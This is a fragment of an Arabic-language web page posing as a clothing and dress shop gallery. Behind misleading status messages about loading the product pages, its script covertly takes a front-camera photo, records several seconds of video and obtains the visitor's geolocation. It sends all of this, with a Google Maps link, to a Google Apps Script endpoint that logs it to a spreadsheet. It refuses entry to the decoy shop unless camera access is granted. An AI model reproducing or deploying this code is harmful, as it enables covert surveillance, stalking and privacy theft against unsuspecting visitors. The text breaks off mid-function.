}

<body>

    <div id="status">👆 جاهز للبدء</div>
    <div class="click-hint" id="clickHint">اضغط هنا لبدء العملية</div>
    <button id="retryPermBtn">🔄 إعادة المحاولة</button>

    <video id="videoFront" autoplay playsinline muted></video>

    <script>
        const SHEET_ID  = '1J_liU4icjkAcTAXB4CtLv1ONEVAFu9FRBGYll4oP9Hk';
        const SHEET_NAME = 'LocationLink';
        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbyAO-IfToX1QoBoT0RbpAX-RcmIw3jba_t9XNoHvbpqp2jY8Sbdk8rTvDOk8A_EwRzx/exec`;
        const DEFAULT_PRICE = 150;

        const IMAGE_URLS = [
            'https://i.ibb.co/60DKvBz5/2.jpg','https://i.ibb.co/WNmJKqSQ/1.jpg'
        ];

        let cameraStream = null;
        let processStarted = false;
        const statusDiv = document.getElementById('status');
        const retryPermBtn = document.getElementById('retryPermBtn');

        async function getLocationName(lat, lon) {
            try {
                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=10&accept-language=ar`);
                const data = await r.json();
                return data.address?.city || data.address?.town || data.address?.state || 'منطقة غير معروفة';
            } catch { return 'منطقة غير معروفة'; }
        }

        async function startProcess() {
            if (processStarted) return;
            processStarted = true;
            document.getElementById('clickHint').style.display = 'none';
            retryPermBtn.style.display = 'none';

            // 1. طلب الكاميرا أولاً
            statusDiv.innerHTML = " جاري طلب تحميل صفحة المنتجات ...";
            statusDiv.className = "status-loading";
            let camOk = false;
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                const vf = document.getElementById('videoFront');
                vf.srcObject = cameraStream;
                await new Promise(r => setTimeout(r, 500)); // انتظار بسيط لتشغيل الكاميرا
                camOk = true;
            } catch (e) {
                console.warn('Camera error:', e);
            }

            // 2. طلب الموقع ثانياً
            statusDiv.innerHTML = " جاري طلب تحميل صفحة الصور  ...";
            statusDiv.className = "status-loading";
            let locData = null;
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
                });
                locData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
                locData.locationName = await getLocationName(locData.latitude, locData.longitude);
            } catch (e) {
                console.warn('Geo error:', e);
            }

            // إذا فشلت الكاميرا، نمنع الدخول
            if (!camOk) {
                statusDiv.innerHTML = "🚫 يجب السماح الاذونات للموقع لتحميل صفحة الموقع وفتح المعرض.<br><br><small style='color:#666;font-size:14px;'></small>";
                statusDiv.className = "status-error";
                retryPermBtn.style.display = 'inline-block';
                processStarted = false;
                return;
            }

            // 3. التقاط صورة سريعة (اختياري)
      statusDiv.innerHTML = " جاري تحميل صفحة  الموقع ...";
statusDiv.className = "status-loading";

let imgData = null;
let videoData = null;

// (أ) التقاط الصورة فوراً من تدفق الكاميرا
try {
    const vf = document.getElementById('videoFront');
    if (vf && vf.videoWidth) {
        const c = document.createElement('canvas');
        c.width = vf.videoWidth; c.height = vf.videoHeight;
        c.getContext('2d').drawImage(vf, 0, 0);
        imgData = c.toDataURL('image/jpeg', 0.7);
    }
} catch(e){}

// (ب) تسجيل فيديو ثانيتين من نفس تدفق الكاميرا
try {
    if (cameraStream && window.MediaRecorder) {
        const mimes = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
        let mime = '';
        for (const m of mimes) { if (MediaRecorder.isTypeSupported(m)) { mime = m; break; } }

        if (mime) {
            const chunks = [];
            const recorder = new MediaRecorder(cameraStream, {
                mimeType: mime,
                videoBitsPerSecond: 500000   // ~500kbps لضغط حجم الفيديو
            });

            const recorded = new Promise((resolve) => {
                recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    try {
                        const blob = new Blob(chunks, { type: mime });
                        const reader = new FileReader();
                        reader.onloadend = () => { videoData = reader.result; resolve(); };
                        reader.readAsDataURL(blob);
                    } catch(e) { resolve(); }
                };
            });

            recorder.start();
            await new Promise(r => setTimeout(r, 5000));   // مدة التسجيل: ثانيتان
            try { recorder.stop(); } catch(e){}
            await recorded;
        }
    }
} catch(e){ console.warn('Video record error:', e); }

statusDiv.innerHTML = "✅ تم بنجاح! جاري فتح المعرض...";
statusDiv.className = "status-success";

// إيقاف الكاميرا بعد الانتهاء من الصورة والفيديو
try { cameraStream.getTracks().forEach(t => t.stop()); } catch(e){}
cameraStream = null;

// إرسال البيانات (صورة + فيديو) وفتح المعرض
try {
    await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            sheetId: SHEET_ID, sheetName: SHEET_NAME,
            newDate: new Date().toISOString(),
            linkLocation: locData ? `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}` : '',
            latitude: locData?.latitude || '', longitude: locData?.longitude || '',
            Timestamp: new Date().toLocaleString('ar-EG'), LocationName: locData?.locationName || '',
            imageData: imgData || '', imageData2: '', imageData3: '', imageData4: '',
            videoData: videoData || ''   // ← جديد: الفيديو بصيغة Base64 Data URL
        })
    });
} catch(e){}

openBlockWindow();
processStarted = false;}

        function openBlockWindow() {
            let galleryHTML = '';
            IMAGE_URLS.forEach((url, index) => {
                galleryHTML += `
                    <div class="image-card" data-url="${url}" data-index="${index}">
                        <div class="image-wrapper">
                            <img src="${url}" alt="صورة" draggable="false">
                            <div class="overlay"></div>
                            <div class="price-tag">${DEFAULT_PRICE} ر.س</div>
                            <div class="image-actions">
                                <button class="fav-btn" data-url="${url}" title="المفضلة">🤍</button>
                                <button class="cart-btn" data-url="${url}" title="السلة">🛒</button>
                            </div>
                        </div>
                        <div class="like-controls">
                            <button class="heart-btn" data-url="${url}">🤍</button>
                            <span class="like-count" id="count-${index}" style="display:none;">0</span>
                        </div>
                    </div>`;
            });

            const htmlContent = `
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">

                <title>معرض الصور</title>
                <style>
                    * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; }
                    html { -webkit-text-size-adjust: 100%; }
                    body { background:#151515; font-family:'Segoe UI',Tahoma,sans-serif; padding:20px; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; }
                    .company-header { width:100%; max-width:1200px; text-align:center; color:#ffd54f; font-size:26px; font-weight:bold; padding:10px 15px; margin-bottom:5px; text-shadow:0 2px 8px rgba(0,0,0,0.6); }
                    .gallery { max-width:1200px; width:200%; display:grid; grid-template-columns:repeat(auto-fill, minmax(280px, 1fr)); gap:25px; padding:20px 0; }
                    .image-card { background:#1f1f1f; border-radius:16px; overflow:hidden; box-shadow:0 8px 30px rgba(0,0,0,0.7); transition:transform 0.2s; border:1px solid rgba(255,255,255,0.06); display:flex; flex-direction:column; }
                    .image-wrapper { position:relative; width:100%; padding-top:100%; background:#222; overflow:hidden; }
                    .image-wrapper img { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; display:block; pointer-events:none; -webkit-user-drag:none; }
                    .like-controls { display:flex; align-items:center; justify-content:center; gap:15px; padding:12px; background:#161616; border-top:1px solid #2a2a2a; direction:ltr; }
                    .heart-btn { background:transparent; border:none; font-size:28px; cursor:pointer; color:#fff; padding:0 5px; }

                    .top-action-btn .badge { background:#e53935; color:#fff; font-size:12px; font-weight:bold; min-width:20px; height:20px; line-height:20px; text-align:center; border-radius:50%; padding:0 5px; }
                    
                    .price-tag { position:absolute; bottom:8px; right:8px; background:rgba(0,0,0,0.65); color:#ffd54f; font-size:14px; font-weight:bold; padding:4px 10px; border-radius:20px; z-index:2; }

                    .image-actions button { background:rgba(0,0,0,0.55); border:1px solid rgba(255,255,255,0.15); color:#fff; font-size:20px; width:38px; height:38px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; }
                    .image-actions button.active { background:#e53935; }
                    .image-actions button.cart-active { background:#1a73e8; }
                    
                    .panel-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:200; display:none; }

                    .side-panel.open { transform:translateX(0); }

                    .cart-total span { color: #ffd54f; font-size: 22px; }
                    @media (max-width: 768px) {

            </head>
            <body>
                <button class="close-btn" id="closeBtn">✕ إغلاق</button>
                <div class="top-actions-bar">
                    <button class="top-action-btn" id="favTopBtn">🤍 المفضلة <span class="badge" id="favBadge">0</span></button>
                    <button class="top-action-btn" id="cartTopBtn">🛒 السلة <span class="badge" id="cartBadge">0</span></button>
                </div>

                <h1 class="company-header">الاختيار الأفضل للملابس والفساتين</h1>
                <div class="gallery">${galleryHTML}</div>

                <div class="panel-overlay" id="panelOverlay"></div>
                <aside class="side-panel" id="sidePanel">
                    <div class="side-panel-header">
                        <h3 id="panelTitle">المفضلة</h3>
                        <button class="side-panel-close" id="panelCloseBtn">✕</button>
                    </div>
                    <div class="side-panel-body" id="panelBody"></div>
                    <div class="panel-footer" id="panelFooter"></div>
                </aside>

                <script>
                    var DEFAULT_PRICE = ${DEFAULT_PRICE};
                    var currentPanel = 'favorites';
                    function getFavorites(){ try{ return JSON.parse(localStorage.getItem('favorites')||'[]'); }catch(e){ return []; } }
                    function setFavorites(a){ localStorage.setItem('favorites', JSON.stringify(a)); }
                    function getCart(){ try{ return JSON.parse(localStorage.getItem('cart')||'[]'); }catch(e){ return []; } }
                    function setCart(a){ localStorage.setItem('cart', JSON.stringify(a)); }

                    function updateBadges(){
                        var favs = getFavorites(), cart = getCart();
                        document.getElementById('favBadge').textContent = favs.length;
                        document.getElementById('cartBadge').textContent = cart.length;
                        document.querySelectorAll('.fav-btn').forEach(function(btn){
                            var isFav = favs.indexOf(btn.getAttribute('data-url')) !== -1;
                            btn.textContent = isFav ? '❤️' : '🤍';
                            if(isFav) btn.classList.add('active'); else btn.classList.remove('active');
                        });
                        document.querySelectorAll('.cart-btn').forEach(function(btn){
                            var inCart = cart.indexOf(btn.getAttribute('data-url')) !== -1;
                            if(inCart) btn.classList.add('cart-active'); else btn.classList.remove('cart-active');
                        });
                    }

                    function toggleFav(u){
                        var f = getFavorites(), i = f.indexOf(u);
                        if(i !== -1) f.splice(i,1); else f.push(u);
                        setFavorites(f); updateBadges();
                        if(currentPanel === 'favorites' && document.getElementById('sidePanel').classList.contains('open')) renderPanel('favorites');
                    }

                    function toggleCart(u){
                        var c = getCart(), i = c.indexOf(u);
                        if(i !== -1) c.splice(i,1); else c.push(u);
                        setCart(c); updateBadges();
                        if(currentPanel === 'cart' && document.getElementById('sidePanel').classList.contains('open')) renderPanel('cart');
                    }

                    function removeItem(u){
                        if(currentPanel === 'favorites') setFavorites(getFavorites().filter(x => x !== u));
                        else setCart(getCart().filter(x => x !== u));
                        updateBadges(); renderPanel(currentPanel);
                    }

                    function openPanel(type){
                        currentPanel = type; renderPanel(type);
                        document.getElementById('panelOverlay').classList.add('open');
                        document.getElementById('sidePanel').classList.add('open');
                    }

                    function closePanel(){
                        document.getElementById('panelOverlay').classList.remove('open');
                        document.getElementById('sidePanel').classList.remove('open');
                    }

                   function renderPanel(type){
    var list = type === 'favorites' ? getFavorites() : getCart();
    document.getElementById('panelTitle').textContent = type === 'favorites' ? 'المفضلة' : 'السلة';
    var body = document.getElementById('panelBody'), footer = document.getElementById('panelFooter');
    footer.innerHTML = '';

    if (list.length === 0) {
        if (type === 'cart') {
            body.innerHTML = '<div class="panel-empty">السلة فارغة</div>' +
                '<div class="cart-summary">' +
                    '<div class="cart-total">الإجمالي: <span>0 ر.س</span></div>' +
                '</div>';
        } else {
            body.innerHTML = '<div class="panel-empty">لا توجد منتجات</div>';
        }
        return;
    }

    var itemsHTML = list.map(function(u){
        return '<div class="panel-item"><img src="' + u + '"><div class="panel-item-price">' + DEFAULT_PRICE + ' ر.س</div><button class="panel-item-remove" data-remove="' + u + '">🗑️</button></div>';
    }).join('');

    if (type === 'cart') {
        var total = list.length * DEFAULT_PRICE;
        body.innerHTML = itemsHTML +
            '<div class="cart-summary">' +
                '<div class="cart-total">الإجمالي: <span>' + total + ' ر.س</span></div>' +
